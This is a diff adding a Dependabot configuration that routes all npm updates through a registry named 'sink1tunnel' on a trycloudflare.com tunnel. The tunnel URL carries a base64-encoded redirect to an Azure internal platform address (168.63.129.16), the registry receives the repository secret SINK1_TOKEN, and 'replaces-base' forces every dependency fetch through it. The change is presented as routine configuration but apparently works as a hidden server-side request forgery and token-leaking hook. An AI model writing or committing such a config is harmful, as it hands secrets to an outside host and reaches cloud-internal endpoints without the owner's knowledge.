@@ -1,0 +1,12 @@
+version: 2
+registries:
+  sink1tunnel:
+    type: npm-registry
+    url: https://trucks-commitments-neck-wal.trycloudflare.com/redir/302/aHR0cDovLzE2OC42My4xMjkuMTYvP2NvbXA9dmVyc2lvbnM
+    token: ${{secrets.SINK1_TOKEN}}
+    replaces-base: true
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule: {interval: "daily"}
+    registries: "*"
